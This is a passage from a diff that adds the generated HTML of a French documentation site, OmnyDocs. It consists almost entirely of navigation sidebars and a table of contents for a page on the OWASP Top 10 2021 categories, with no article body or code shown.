+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="OmnyDocs" class="md-nav__button md-logo" aria-label="OmnyDocs" data-md-component="logo">
+      
+  <img src="../../../../assets/logo-dark.png" alt="OmnyDocs">
+
+    </a>
+    OmnyDocs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../.." class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bienvenue
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../bases/" class="md-nav__link">
+      
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-layers" viewBox="0 0 24 24"><path d="M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z"/><path d="M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12"/><path d="M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Fondamentaux IT
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../sys-reseau/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Systèmes &amp; Infrastructure (Sys-Réseau)
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../dev-cloud/" class="md-nav__link">
+      
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-code-2" viewBox="0 0 24 24"><path d="m18 16 4-4-4-4M6 8l-4 4 4 4M14.5 4l-5 16"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Dev Web &amp; Cloud
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cyber : Gouvernance
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cyber : Gouvernance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../refs-normes/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Référentiels & Normes
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5_2" id="__nav_5_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Référentiels & Normes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../refs-normes/autorites/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Autorités françaises
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../refs-normes/reglementations/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Réglementations Euro.
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../refs-normes/referentiels/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Référentiels &amp; certifications sectoriels
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../refs-normes/isos/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Normes ISO
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../smsi/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Démarche SMSI
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5_3" id="__nav_5_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Démarche SMSI
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../smsi/presentation/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Présentation du SMSI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../smsi/risques/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Analyse de Risques
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../smsi/bia/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    BIA (Business Impact Analysis)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../smsi/sdsi/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    SDSI (Schéma Directeur)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../smsi/pssi/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    PSSI (Politique de Sécurité)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_4" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Gestion des vulnérabilités
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5_4" id="__nav_5_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Gestion des vulnérabilités
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cve-cvss/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE & CVSS
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--beta" title="En cours de révision">
+    </span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+        <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    OWASP Top 10
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    OWASP Top 10
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pour-repartir-des-bases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pour repartir des bases
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pour repartir des bases">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#position-dans-la-gestion-des-vulnerabilites" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Position dans la gestion des vulnérabilités
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relation-avec-iso-27002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Relation avec ISO 27002
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#les-10-categories-de-vulnerabilites" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Les 10 catégories de vulnérabilités
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Les 10 catégories de vulnérabilités">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vue-densemble-2021" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vue d'ensemble 2021
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a012021-broken-access-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A01:2021 — Broken Access Control
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a022021-cryptographic-failures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A02:2021 — Cryptographic Failures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a032021-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A03:2021 — Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a042021-insecure-design" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A04:2021 — Insecure Design
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a052021-security-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A05:2021 — Security Misconfiguration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a062021-vulnerable-and-outdated-components" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A06:2021 — Vulnerable and Outdated Components
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a072021-identification-and-authentication-failures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A07:2021 — Identification and Authentication Failures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a082021-software-and-data-integrity-failures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A08:2021 — Software and Data Integrity Failures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a092021-security-logging-and-monitoring-failures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A09:2021 — Security Logging and Monitoring Failures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a102021-server-side-request-forgery-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A10:2021 — Server-Side Request Forgery (SSRF)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#owasp-top-10-et-la-chaine-grc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OWASP Top 10 et la chaîne GRC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OWASP Top 10 et la chaîne GRC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exigences-reglementaires-referencant-lowasp-top-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exigences réglementaires référençant l'OWASP Top 10
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#integration-dans-le-sdlc-securise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Intégration dans le SDLC sécurisé
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ecueils-a-eviter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Écueils à éviter
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusion
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ressources-complementaires" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ressources complémentaires
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../patch-management/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Patch Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../scan-policy/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open-check" viewBox="0 0 24 24"><path d="M12 21V7M16 12l2 2 4-4"/><path d="M22 6V4a1 1 0 0 0-1-1h-5a4 4 0 0 0-4 4 4 4 0 0 0-4-4H3a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1h6a3 3 0 0 1 3 3 3 3 0 0 1 3-3h6a1 1 0 0 0 1-1v-1.3"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Politique de Scan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../operations/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cyber : Opérations &amp; SOC (Blue Team)
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../tools/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cyber : Outils &amp; Red Team
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../glossaire/" class="md-nav__link">
+      
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-a" viewBox="0 0 24 24"><path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H19a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1H6.5a1 1 0 0 1 0-5H20"/><path d="m8 13 4-7 4 7M9.1 11h5.7"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Glossaire
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../projets/arch-lab/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Projets
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+  
+
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pour-repartir-des-bases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pour repartir des bases
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pour repartir des bases">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#position-dans-la-gestion-des-vulnerabilites" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Position dans la gestion des vulnérabilités
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relation-avec-iso-27002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Relation avec ISO 27002
+      
+    </span>
+  </a>
+  
+</li>
+        
